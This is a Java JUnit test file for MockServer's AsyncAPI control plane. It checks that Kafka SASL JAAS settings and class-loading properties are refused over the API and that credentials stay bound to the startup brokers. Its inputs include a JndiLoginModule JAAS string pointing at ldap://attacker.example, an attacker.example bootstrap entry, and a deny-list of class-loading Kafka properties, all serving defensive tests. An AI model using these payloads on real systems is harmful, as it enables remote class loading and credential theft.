package org.mockserver.async.controlplane;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import org.junit.After;
import org.junit.Test;
import org.mockserver.async.security.KafkaSecurityProperties;
import org.mockserver.configuration.Configuration;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Properties;

import static org.hamcrest.MatcherAssert.assertThat;
import static org.hamcrest.Matchers.*;

/**
 * A Kafka JAAS configuration names the login module class the Kafka client loads, so it is startup-only:
 * {@code PUT /mockserver/asyncapi} refuses a {@code kafkaSecurity.saslJaasConfig} (and any other field that is not a
 * known {@code kafkaSecurity} field, so no class-loading Kafka property can be smuggled in), while the
 * {@code asyncKafkaSaslJaasConfig} startup property still reaches the Kafka client.
 */
public class AsyncApiControlPlaneKafkaStartupOnlyTest {

    private static final ObjectMapper MAPPER = new ObjectMapper();

    private static final String STARTUP_JAAS = "org.apache.kafka.common.security.plain.PlainLoginModule required"
        + " username=\"alice\" password=\"alice-secret\";";
    private static final String JNDI_JAAS = "com.sun.security.auth.module.JndiLoginModule required"
        + " user.provider.url=\"ldap://attacker.example/o=x\" group.provider.url=\"ldap://attacker.example/o=x\";";

    private static final String SPEC = "{\"asyncapi\":\"2.6.0\",\"info\":{\"title\":\"t\",\"version\":\"1\"},"
        + "\"channels\":{\"orders\":{\"publish\":{\"message\":{\"payload\":{\"type\":\"string\"}}}}}}";

    private final Configuration configuration = Configuration.configuration().asyncKafkaBootstrapServers("broker:9093");
    private final AsyncApiControlPlaneImpl controlPlane = new AsyncApiControlPlaneImpl(configuration);

    @After
    public void tearDown() {
        controlPlane.reset();
    }

    @Test
    public void shouldRefuseASaslJaasConfigSentOverTheControlPlane() throws Exception {
        IllegalArgumentException refused = refusal(kafkaSecurity("saslJaasConfig", JNDI_JAAS));

        assertThat(refused.getMessage(), containsString("'kafkaSecurity.saslJaasConfig' cannot be set over the control plane"));
        assertThat(refused.getMessage(), containsString("must be set at startup"));
        assertThat(refused.getMessage(), containsString("mockserver.asyncKafkaSaslJaasConfig"));
        assertThat("the refusal must not echo the JAAS configuration back", refused.getMessage(), not(containsString("JndiLoginModule")));
    }

    @Test
    public void shouldRefuseASaslJaasConfigEvenWhenAStartupOneIsConfigured() throws Exception {
        configuration.asyncKafkaSaslJaasConfig(STARTUP_JAAS);

        assertThat(refusal(kafkaSecurity("saslJaasConfig", STARTUP_JAAS)).getMessage(), containsString("must be set at startup"));
    }

    @Test
    public void shouldRefuseAJaasConfigurationPlacedDirectlyInBrokerConfig() throws Exception {
        for (String field : Arrays.asList("saslJaasConfig", "sasl.jaas.config", "kafkaSaslJaasConfig")) {
            ObjectNode brokerConfig = MAPPER.createObjectNode();
            brokerConfig.put("kafkaBootstrapServers", "broker:9093");
            brokerConfig.put(field, JNDI_JAAS);

            assertThat(field, refusal(brokerConfig).getMessage(), containsString("must be set at startup"));
        }
    }

    @Test
    public void shouldRefuseEveryClassLoadingKafkaPropertyAsAnUnknownField() throws Exception {
        List<String> accepted = new ArrayList<>();
        for (String field : Arrays.asList(
            "sasl.jaas.config", "saslLoginClass", "sasl.login.class",
            "saslClientCallbackHandlerClass", "sasl.client.callback.handler.class",
            "saslLoginCallbackHandlerClass", "sasl.login.callback.handler.class",
            "interceptorClasses", "interceptor.classes", "securityProviders", "security.providers",
            "configProviders", "config.providers", "keySerializer", "value.serializer", "key.deserializer",
            "valueDeserializer", "sslEngineFactoryClass", "ssl.engine.factory.class", "metricReporters",
            "partitionerClass", "saslJaasConfigFile")) {
            try {
                controlPlane.parseBrokerConfig(kafkaSecurity(field, "org.example.Evil"));
                accepted.add(field);
            } catch (IllegalArgumentException refused) {
                assertThat(refused.getMessage(), containsString("'" + field + "'"));
                assertThat(refused.getMessage(), containsString("cannot be set over the control plane"));
            }
        }

        assertThat("kafkaSecurity fields accepted rather than refused: " + accepted, accepted, is(empty()));
    }

    @Test
    public void shouldRefuseASaslJaasConfigOnLoadSoNoBrokerConnectionIsMade() throws Exception {
        ObjectNode body = MAPPER.createObjectNode();
        body.put("spec", SPEC);
        body.set("brokerConfig", kafkaSecurity("saslJaasConfig", JNDI_JAAS));

        IllegalArgumentException refused = null;
        try {
            controlPlane.load(MAPPER.writeValueAsString(body));
        } catch (IllegalArgumentException e) {
            refused = e;
        }

        assertThat("load must refuse the request with a client error (400)", refused, is(notNullValue()));
        assertThat(refused.getMessage(), containsString("must be set at startup"));
        assertThat(controlPlane.status().get("publishers").asInt(), is(0));
    }

    @Test
    public void shouldTreatAJsonNullSaslJaasConfigAsAbsent() throws Exception {
        ObjectNode brokerConfig = kafkaSecurity("saslMechanism", "PLAIN");
        ((ObjectNode) brokerConfig.get("kafkaSecurity")).putNull("saslJaasConfig");

        AsyncApiControlPlaneImpl.BrokerConfig config = controlPlane.parseBrokerConfig(brokerConfig);

        assertThat(config.kafkaSecurity.getSaslJaasConfig(), is(nullValue()));
    }

    @Test
    public void shouldGiveTheKafkaClientTheStartupJaasConfigForASaslProtocol() throws Exception {
        configuration.asyncKafkaSaslJaasConfig(STARTUP_JAAS).asyncKafkaBootstrapServers("broker:9093");

        AsyncApiControlPlaneImpl.BrokerConfig config = controlPlane.parseBrokerConfig(kafkaSecurity("saslMechanism", "PLAIN"));

        Properties kafkaClientProperties = new Properties();
        KafkaSecurityProperties.applySecurity(kafkaClientProperties, config.kafkaSecurity);
        assertThat(kafkaClientProperties.getProperty("security.protocol"), is("SASL_PLAINTEXT"));
        assertThat(kafkaClientProperties.getProperty("sasl.mechanism"), is("PLAIN"));
        assertThat(kafkaClientProperties.getProperty("sasl.jaas.config"), is(STARTUP_JAAS));
    }

    @Test
    public void shouldRefuseASaslRequestNamingADifferentBootstrapSoTheStartupJaasIsNeverSentThere() throws Exception {
        configuration.asyncKafkaSaslJaasConfig(STARTUP_JAAS).asyncKafkaBootstrapServers("broker:9092");
        ObjectNode body = MAPPER.createObjectNode();
        body.put("spec", SPEC);
        ObjectNode brokerConfig = kafkaSecurity("saslMechanism", "PLAIN");
        brokerConfig.put("kafkaBootstrapServers", "attacker.example:9092,broker:9092");
        body.set("brokerConfig", brokerConfig);

        IllegalArgumentException refused = refusal(brokerConfig);
        assertThat(refused.getMessage(), containsString("'kafkaBootstrapServers' must be omitted or match the startup mockserver.asyncKafkaBootstrapServers"));
        assertThat("the refusal must not echo the JAAS configuration", refused.getMessage(), not(containsString("alice-secret")));

        IllegalArgumentException refusedOnLoad = null;
        try {
            controlPlane.load(MAPPER.writeValueAsString(body));
        } catch (IllegalArgumentException e) {
            refusedOnLoad = e;
        }
        assertThat("load must refuse the request with a client error (400)", refusedOnLoad, is(notNullValue()));
        assertThat(controlPlane.status().get("publishers").asInt(), is(0));
    }

    @Test
    public void shouldRefuseEverySaslRequestWhenNoStartupBootstrapIsSet() throws Exception {
        configuration.asyncKafkaBootstrapServers("");
        ObjectNode omitted = kafkaSecurity("saslMechanism", "PLAIN");
        omitted.remove("kafkaBootstrapServers");

        for (JsonNode brokerConfig : Arrays.asList(kafkaSecurity("saslMechanism", "PLAIN"), omitted)) {
            assertThat(refusal(brokerConfig).getMessage(), containsString("a SASL securityProtocol needs mockserver.asyncKafkaBootstrapServers"));
        }
        configuration.asyncKafkaSaslJaasConfig(STARTUP_JAAS);
        assertThat(refusal(omitted).getMessage(), containsString("to be set before the server starts"));
    }

    @Test
    public void shouldGiveTheStartupJaasWhenTheRequestOmitsOrRepeatsTheStartupBootstrap() throws Exception {
        configuration.asyncKafkaSaslJaasConfig(STARTUP_JAAS).asyncKafkaBootstrapServers("broker:9092, other:9093");

        ObjectNode repeated = kafkaSecurity("saslMechanism", "PLAIN");
        repeated.put("kafkaBootstrapServers", " OTHER:9093,broker:9092 ");
        AsyncApiControlPlaneImpl.BrokerConfig named = controlPlane.parseBrokerConfig(repeated);
        assertThat(named.kafkaSecurity.getSaslJaasConfig(), is(STARTUP_JAAS));

        ObjectNode omitted = kafkaSecurity("saslMechanism", "PLAIN");
        omitted.remove("kafkaBootstrapServers");
        AsyncApiControlPlaneImpl.BrokerConfig defaulted = controlPlane.parseBrokerConfig(omitted);
        assertThat(defaulted.kafkaSecurity.getSaslJaasConfig(), is(STARTUP_JAAS));
        assertThat(defaulted.kafkaBootstrapServers, is("broker:9092, other:9093"));
    }

    @Test
    public void shouldBindTheBootstrapForASaslRequestEvenWithoutAStartupJaas() throws Exception {
        // with no startup JAAS the Kafka client uses the JVM's JAAS login configuration, also a server-held credential
        ObjectNode elsewhere = kafkaSecurity("saslMechanism", "PLAIN");
        elsewhere.put("kafkaBootstrapServers", "attacker.example:9092");
        assertThat(refusal(elsewhere).getMessage(), containsString("'kafkaBootstrapServers' must be omitted or match"));

        AsyncApiControlPlaneImpl.BrokerConfig startup = controlPlane.parseBrokerConfig(kafkaSecurity("saslMechanism", "PLAIN"));
        assertThat(startup.kafkaBootstrapServers, is("broker:9093"));
        assertThat(startup.kafkaSecurity.getSaslJaasConfig(), is(nullValue()));

        for (String protocol : Arrays.asList("PLAINTEXT", "SSL")) {
            ObjectNode notSasl = MAPPER.createObjectNode();
            notSasl.put("kafkaBootstrapServers", "attacker.example:9092");
            notSasl.putObject("kafkaSecurity").put("securityProtocol", protocol);
            assertThat(protocol, controlPlane.parseBrokerConfig(notSasl).kafkaBootstrapServers, is("attacker.example:9092"));
        }
    }

    @Test
    public void shouldNotGiveTheStartupJaasConfigToANonSaslProtocol() throws Exception {
        configuration.asyncKafkaSaslJaasConfig(STARTUP_JAAS);
        ObjectNode brokerConfig = MAPPER.createObjectNode();
        brokerConfig.put("kafkaBootstrapServers", "broker:9093");
        brokerConfig.putObject("kafkaSecurity").put("securityProtocol", "SSL");

        AsyncApiControlPlaneImpl.BrokerConfig config = controlPlane.parseBrokerConfig(brokerConfig);

        assertThat(config.kafkaSecurity.getSaslJaasConfig(), is(nullValue()));
        assertThat(controlPlane.parseBrokerConfig(MAPPER.readTree("{\"kafkaBootstrapServers\":\"broker:9092\"}")).kafkaSecurity, is(nullValue()));
    }

    @Test
    public void shouldRefuseAnUnsupportedSaslMechanismOrSecurityProtocol() throws Exception {
        assertThat(refusal(kafkaSecurity("saslMechanism", "EVIL")).getMessage(), containsString("allowed values are [GSSAPI, PLAIN, SCRAM-SHA-256, SCRAM-SHA-512, OAUTHBEARER]"));

        ObjectNode badProtocol = MAPPER.createObjectNode();
        badProtocol.putObject("kafkaSecurity").put("securityProtocol", "SASL_EVIL");
        assertThat(refusal(badProtocol).getMessage(), containsString("allowed values are [PLAINTEXT, SSL, SASL_PLAINTEXT, SASL_SSL]"));
    }

    @Test
    public void shouldAcceptEveryBuiltInSaslMechanismAndALowerCaseProtocol() throws Exception {
        for (String mechanism : AsyncApiControlPlaneImpl.KAFKA_SASL_MECHANISMS) {
            ObjectNode brokerConfig = MAPPER.createObjectNode();
            brokerConfig.putObject("kafkaSecurity").put("securityProtocol", "sasl_ssl").put("saslMechanism", mechanism);

            AsyncApiControlPlaneImpl.BrokerConfig config = controlPlane.parseBrokerConfig(brokerConfig);

            assertThat(config.kafkaSecurity.getSecurityProtocol(), is("SASL_SSL"));
            assertThat(config.kafkaSecurity.getSaslMechanism(), is(mechanism));
        }
    }

    private IllegalArgumentException refusal(JsonNode brokerConfig) {
        try {
            controlPlane.parseBrokerConfig(brokerConfig);
        } catch (IllegalArgumentException refused) {
            return refused;
        }
        throw new AssertionError("expected the control plane to refuse " + brokerConfig);
    }

    private static ObjectNode kafkaSecurity(String field, String value) {
        ObjectNode brokerConfig = MAPPER.createObjectNode();
        brokerConfig.put("kafkaBootstrapServers", "broker:9093");
        ObjectNode kafkaSecurity = brokerConfig.putObject("kafkaSecurity");
        kafkaSecurity.put("securityProtocol", "SASL_PLAINTEXT");
        kafkaSecurity.put("saslMechanism", "PLAIN");
        kafkaSecurity.put(field, value);
        return brokerConfig;
    }
}
